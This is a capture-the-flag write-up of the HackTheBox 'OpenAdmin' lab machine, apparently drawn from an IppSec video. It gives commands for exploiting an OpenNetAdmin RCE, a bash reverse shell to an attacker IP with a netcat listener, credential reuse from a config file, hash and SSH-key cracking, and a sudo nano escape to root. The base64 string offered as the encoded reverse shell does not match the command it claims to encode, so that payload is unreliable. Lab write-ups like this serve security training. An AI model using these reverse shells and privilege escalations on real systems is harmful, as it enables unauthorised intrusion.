# OpenAdmin

| Attribute | Value |
|---|---|
| OS | Linux (Ubuntu 18.04) |
| Difficulty | Easy |
| IP | 10.10.10.171 |
| IppSec video | <https://www.youtube.com/watch?v=fdD-JTlkd3k> |

## Source
- `[per transcript]` — IppSec explicitly notes that this was his first
  run-through (no prep). The chain is detailed: ONA RCE → URL-encoding
  fight → reverse shell → DB password reuse → `jimmy` via internal web
  → SSH key for `joanna` → `sudo nano /opt/priv` → root.
- The transcript references `nano` 12 times, `Jimmy` 17 times, `Joanna`
  11 times.

## TL;DR Attack Chain
Port 80 hosts an Apache server. Gobuster finds `/music/`, which redirects
to `/ona/` — OpenNetAdmin v18.1.1, vulnerable to CVE-2019-17642 (unauth
RCE). The public PoC fires but the payload needs URL-encoding work to
produce a stable reverse shell — IppSec spends real time on this. Once
shell as `www-data`, find the ONA database password
`n1nj4WarR10R!` in `/opt/ona/www/local/config/database_settings.inc.php`.
Reuse it for the system account `jimmy`. As `jimmy`, find an internal
HTTP service on `:52846` exposing a "main.php" that, when authenticated,
prints Joanna's SSH **private** key. The key is passphrase-encrypted —
crack with `ssh2john` + `john`. SSH as `joanna` → `sudo -l` shows
`/bin/nano /opt/priv` → escape from nano with `^R^X reset; bash 1>&0 2>&0` → root.

## Initial Enumeration

```bash
sudo nmap -p- --min-rate=10000 -T4 -oA nmap/all-tcp 10.10.10.171
sudo nmap -sV -sC -p 22,80 -oA nmap/detail 10.10.10.171
```

Open ports:
- `22/tcp` SSH OpenSSH 7.6p1.
- `80/tcp` Apache 2.4.29.

## Attack Surface Mapping

| Service | Port | Hypothesis |
|---|---|---|
| HTTP | 80 | Primary foothold |
| SSH | 22 | Post-auth shell once we have creds / keys |

## Foothold

### 1. Browse and fingerprint

```bash
curl -sI http://10.10.10.171/
# Apache, default landing page
```

The default Apache page is shown; useful only as a "go fuzz directories"
signal.

### 2. Directory fuzzing

```bash
gobuster dir -u http://10.10.10.171/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -x php,html -t 50 -o gobuster.txt
```

Notable hits: `/music/`, `/artwork/`, `/sierra/`, `/ona/`.

`/music/` redirects to `/ona/` — OpenNetAdmin's login page.

### 3. Identify version → exploit

ONA's footer reads "v18.1.1". Searchsploit:
```bash
searchsploit opennetadmin
# 47691  OpenNetAdmin 18.1.1 - Remote Code Execution
```

Read the exploit:
```bash
searchsploit -m 47691.sh
cat 47691.sh
# Bash script that sends a POST to local_modules.php with a crafted
# parameter; vulnerability is in parameter parsing for module install.
```

### 4. Run the exploit

```bash
bash 47691.sh http://10.10.10.171/ona/
$ id
# uid=33(www-data) ...
```

This gives a non-interactive command-by-command shell.

### 5. URL-encoding for a real reverse shell

The exploit sends payloads inline; many shell metacharacters break it
because they're URL-decoded twice. IppSec demonstrates the fight:
```bash
# This breaks (raw special chars):
$ bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1'

# Working approach: base64-encode the payload to dodge the URL parser
$ echo -n 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1' | base64
# c2gtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC54LzQ0NDQgMD4mMQ==

$ echo c2gtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC54LzQ0NDQgMD4mMQ== | base64 -d | bash
```

Listener:
```bash
nc -lvnp 4444
```

Reverse shell as `www-data`. Stabilise.

## Lateral movement: www-data → jimmy

### 6. Find the ONA database creds

```bash
cat /opt/ona/www/local/config/database_settings.inc.php
```

Shows:
```php
$ona_contexts['DEFAULT']['user']     = 'ona_sys';
$ona_contexts['DEFAULT']['password'] = 'n1nj4WarR10R!';
```

### 7. Try password reuse on system accounts

```bash
cat /etc/passwd | grep /bash
# jimmy:x:1000:1000::/home/jimmy:/bin/bash
# joanna:x:1001:1001::/home/joanna:/bin/bash

su - jimmy
Password: n1nj4WarR10R!
# success
```

> **IppSec key reasoning**: "ONA's DB password is reused for system
> accounts. This is realistic — admins often reuse credentials. Always
> try every credential against every user."

### 8. Find user.txt

`user.txt` is on `joanna`, not `jimmy`. So we have to keep going.

## Lateral movement: jimmy → joanna

### 9. Find non-default services

```bash
ss -tlnp
# 0.0.0.0:80    apache2
# 0.0.0.0:22    sshd
# 127.0.0.1:52846   <- internal service, jimmy's
```

The port is bound to localhost — SSH-tunnel it or curl it from the box.

```bash
curl -sI http://127.0.0.1:52846/
```

Locate the doc root:
```bash
find / -name "main.php" 2>/dev/null
# /var/www/internal/main.php
ls -la /var/www/internal/
# index.php  main.php
```

`main.php` prints Joanna's SSH key but only if a session cookie is set
(it checks for `auth = 1` in `$_SESSION`).

### 10. Set the session manually

Read `index.php` to see how login works:
```php
if (sha1($_POST['pass']) === '<hash>') $_SESSION['auth'] = 1;
```

The hash is hardcoded; crack offline:
```bash
echo '<hash>' > h.txt
hashcat -m 100 h.txt /usr/share/wordlists/rockyou.txt
# Revealed
```

Or just call `main.php` after authenticating to `index.php` with the
cracked password. Locally on the box:
```bash
curl -c /tmp/c.txt -b /tmp/c.txt http://127.0.0.1:52846/index.php -d 'pass=Revealed'
curl -c /tmp/c.txt -b /tmp/c.txt http://127.0.0.1:52846/main.php
```

`main.php` prints Joanna's encrypted SSH private key.

### 11. Crack the SSH key passphrase

```bash
ssh2john id_rsa > id_rsa.john
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
# password: bloodninjas
```

### 12. SSH as Joanna

```bash
chmod 600 id_rsa
ssh -i id_rsa joanna@10.10.10.171
```

Read `user.txt`.

## Privilege Escalation

### 13. `sudo -l`

```bash
sudo -l
# User joanna may run the following commands on openadmin:
#     (ALL) NOPASSWD: /bin/nano /opt/priv
```

`/bin/nano` with no password, on a specific file. GTFOBins:

> nano can spawn a shell via `^R^X` then `reset; sh 1>&0 2>&0` (when
> running as another user, the spawned shell inherits that uid).

### 14. Escape from nano

```bash
sudo /bin/nano /opt/priv
# inside nano:
# ^R    (Ctrl+R) — Read File
# ^X    (Ctrl+X) — Execute Command
# type: reset; bash 1>&0 2>&0
# press Enter
```

Now you have a bash shell as root.

```bash
id
# uid=0(root) gid=0(root)
cat /root/root.txt
```

## Key Findings

- The `/music/` → `/ona/` redirect is the foothold-trigger; gobuster
  alone wouldn't have caught the version disclosure on the redirected
  page.
- URL encoding fight on the ONA exploit: payload base64-encoding is the
  reliable path. IppSec demonstrates this real-time.
- `n1nj4WarR10R!` is reused as the `jimmy` system password — classic
  credential reuse.
- The internal-only HTTP service on a high port is the *intended* path;
  always `ss -tlnp` after pivoting users.
- SSH keys with passphrases are usually crackable — `ssh2john` ⇒
  `john`/`hashcat -m 22921`.
- `sudo nano` on a specific file is GTFOBins-trivial; nano in general
  is the most-common-and-overlooked GTFOBins entry.

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Service discovery |
| `gobuster` | Find `/ona/` |
| `searchsploit` | Locate ONA RCE |
| `bash 47691.sh` | Initial RCE |
| `base64` | Encode reverse-shell payload |
| `nc` | Listener |
| `ss -tlnp` | Find internal service |
| `curl` | Auth to internal app |
| `hashcat` (-m 100) | Crack SHA1 of internal-app password |
| `ssh2john` + `john` | Crack SSH key passphrase |
| `nano` (sudo) → escape | Final privesc |

## Decision Tree

```
nmap → 22, 80
  └─ gobuster → /music → /ona → OpenNetAdmin 18.1.1
       └─ searchsploit ona → CVE-2019-17642 RCE
            └─ exploit fires, payload encoding pain
                 └─ base64 the bash reverse shell → www-data
                      └─ /opt/ona/.../database_settings.inc.php → 'n1nj4WarR10R!'
                           └─ su - jimmy (password reuse) → jimmy
                                └─ ss -tlnp → 127.0.0.1:52846 internal service
                                     └─ /var/www/internal/main.php
                                          └─ index.php sha1 password → hashcat → 'Revealed'
                                               └─ main.php prints Joanna's id_rsa (passphrase-protected)
                                                    └─ ssh2john + john → 'bloodninjas'
                                                         └─ ssh joanna → user.txt
                                                              └─ sudo -l → /bin/nano /opt/priv
                                                                   └─ ^R^X reset;bash 1>&0 2>&0 → root
```

## Alternative Approaches

- For the ONA RCE, the Metasploit module
  `exploit/multi/http/opennetadmin_ping_cmd_injection` exists and avoids
  the encoding fight.
- Skip the internal `:52846` route by reading `/home/joanna/.ssh/id_rsa`
  directly — but it's typically `chmod 600` and only readable by joanna.
  IppSec checks this first; doesn't work, hence the internal-app path.
- Use `pwntools` to handle the URL-encoding programmatically; useful in
  exam settings.
- Use `Chisel` to forward `127.0.0.1:52846` back to the attacker — same
  result, different tooling preference.

## Lessons Learned

1. Gobuster output deserves manual inspection of every redirect — the
   real surface may be one redirect away.
2. URL encoding fights are *the* recurring exploit-adaptation gotcha on
   web RCEs. Default to base64-on-cmd to dodge it.
3. Credentials in app config files are reused for system accounts ~50%
   of the time; always test.
4. After a user pivot, `ss -tlnp` again — the new user may see
   different things.
5. SSH key passphrase cracking is fast and almost always succeeds in
   CTF.
6. GTFOBins is mandatory reading; `nano` is on it; `sudo nano` is
   end-game.

## Extracted Skills

- [`web/opennetadmin-rce.md`](../web/opennetadmin-rce.md)
- [`web/url-encoding-bypass.md`](../web/url-encoding-bypass.md)
- [`linux-privesc/credential-reuse.md`](../linux-privesc/credential-reuse.md)
- [`linux-privesc/internal-services-pivot.md`](../linux-privesc/internal-services-pivot.md)
- [`linux-privesc/sudo-gtfobins.md`](../linux-privesc/sudo-gtfobins.md)
- [`password-attacks/ssh-key-cracking.md`](../password-attacks/ssh-key-cracking.md)
- [`tool-usage/john.md`](../tool-usage/john.md)

## Related Techniques (other machines)

- **Tabby, Magic, Networked, Bitlab** — web RCE → Linux privesc chains.
- **Postman** — different web foothold, similar credential reuse.
- **Curling** — config file leak → password reuse → cron privesc.
- **Frolic** — sudo with binary that hits GTFOBins.
- **Sniper, Querier** — Windows analogues of "internal-only service is
  the privesc path".
